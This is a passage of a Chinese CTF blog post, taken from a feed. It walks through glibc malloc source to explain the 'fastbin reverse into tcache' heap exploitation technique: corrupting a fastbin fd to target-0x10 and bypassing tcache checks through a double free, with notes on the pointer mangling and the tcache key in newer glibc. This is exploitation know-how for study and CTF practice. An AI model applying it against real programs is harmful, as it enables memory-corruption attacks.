 &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当调用<code>malloc</code>的时候，会对<code>__libc_malloc</code>进行调用。如果<code>tcache bin</code>中有相应大小的<code>chunk</code>,就直接利用<code>tcache_get(tc_idx)</code>取出即可。也就是对应如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>多说一句，这里的判定条件是<code>tc_idx &lt; mp_.tcache_bins &amp;&amp;tcache &amp;&amp;tcache-&gt;entries[tc_idx] != NULL</code> 。并没有涉及到<code>tcache-&gt;count[tc_idx]</code>的判断。也就是说我们可以让<code>tcache-&gt;entries[tc_idx] == NULL</code> ,即使<code>tcache-&gt;count[tc_idx] !=0</code>，也能绕过从<code>tcache bin</code>中取<code>chunk</code>的操作。也就是让其<code>double free</code>即可。需要注意的是在高版本的<code>libc</code>中增加了对<code>double free</code> 的检测。具体的做法是加入了<code>key</code>字段以及遍历看<code>fd</code>。这个以后再总结一下。</p><p>我们回到刚刚的分析，如果这个判定条件不成立的话，后面我们会调用<code>_int_malloc</code> </p><p>这里涉及的代码如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当我们<code>malloc</code>的堆块属于<code>fastbin</code>大小的时候，就会进入这个分支。当相应的<code>fastbin</code>中有<code>chunk</code>,并且有两个及以上的时候，就把需要的取出给用户，剩余的放入空闲的<code>tcache bin</code>,具体实施的函数就是<code>tcache_put (tc_victim, tc_idx)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">     <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>tcache_put</code>的实现如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们只要构造两个在<code>fastbin</code>中的<code>chunk</code>,然后修改后面一个<code>chunk</code>(前面<code>chunk</code>的<code>fd</code>指向后面的<code>chunk</code>)的<code>fd</code>为<code>target-0x10</code>,然后再绕过往<code>tcachebin</code>中取<code>chunk</code>的判定(绕过的条件前面以说明)。然后再<code>malloc</code>这个大小的<code>chunk</code>。当检测到<code>fastbin</code>中还有数据，并且<code>tcachebin</code>数据不满的时候，会将<code>fastbin</code>剩下的<code>chunk</code>逆序链入<code>tcachebin</code>。由于修改了后一个<code>chunk</code>的<code>fd</code>为<code>target-0x10</code> ，那么最后会执行<code>tcache_put (target-0x10, tc_idx)</code>,而后执行<code>e-&gt;next = tcache-&gt;entries[tc_idx]</code>的时候，就会将前一个<code>chunk</code>的地址写入<code>(target-0x10)-&gt;next</code>（在这之前有个强制转换成<code>(tcache_entry *)</code>以及<code>chunk2mem</code>的过程,具体的结构体声明以及这个宏的作用就不赘述了)也就是<code>target</code>处。同时由于<code>target</code>这个附近的<code>chunk</code>被放入了<code>tcache bin</code>中(<code>tcache-&gt;entries[tc_idx] = e</code>)所以我们可以申请它</p><p>而<code>glibc2.31</code>及以上就稍有不同，对于<code>target</code>取得偏移也不是<code>0x10</code>了而是<code>0x18</code>，因为存在了对<code>fd</code>指针的加密操作，所以写上的也不是一个堆地址。同时也不能直接让<code>tcache-&gt;entries[tc_idx] == NULL</code> 来绕过取<code>tchache bin</code> 的判断，因为判断条件更改了。而<code>0x18</code>这个偏移对应的是<code>tcache_entry *</code>的<code>key</code>字段。这个在不同版本似乎也有区别。在<code>glibc2.29</code>（应该是<code>glibc2.27 1.4</code>版本朝上)的时候，这个<code>key</code>字段是<code>&amp;tcache</code>，而我在看<code>glibc2.35</code>源码的时候，这个<code>key</code>已经变成了一个完全的随机数了。所以写堆地址这块算是没戏了，不过还是有办法进行申请<code>chunk</code></p><p>这里贴一下不同，首先是对于是从<code>tcache bin</code>中取出还是调用<code>_int_malloc</code>从其他<code>bin</code>中取出,判定条件变成了<code>tc_idx &lt; mp_.tcache_bins&amp;&amp; tcache&amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    victim = tcache_get (tc_idx);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>加入了指针加密操作(<code>fastbin</code>的<code>fd</code>指针也做了相同的加密)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>还有<code>key</code>字段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其初始化如下，为一个随机数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_key_initialize (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些摘自<code>glibc2.35</code>的源码，事实上打补丁有循序渐进的过程，不同版本的具体实施不太一样</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;源码分析&quot;&gt;&lt;a href=&quot;#源码分析&quot; class=&quot;headerlink&quot; title=&quot;源码分析&quot;&gt;&lt;/a&gt;源码分析&lt;/h2&gt;&lt;p&gt;上次祥云杯中遇到了&lt;code&gt;fastbin reverse into tcache&lt;/code&gt;的利用手法，这里简单分析一</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="heap" scheme="http://phot0n.com/tags/heap/"/>
    
  </entry>
  
</feed>
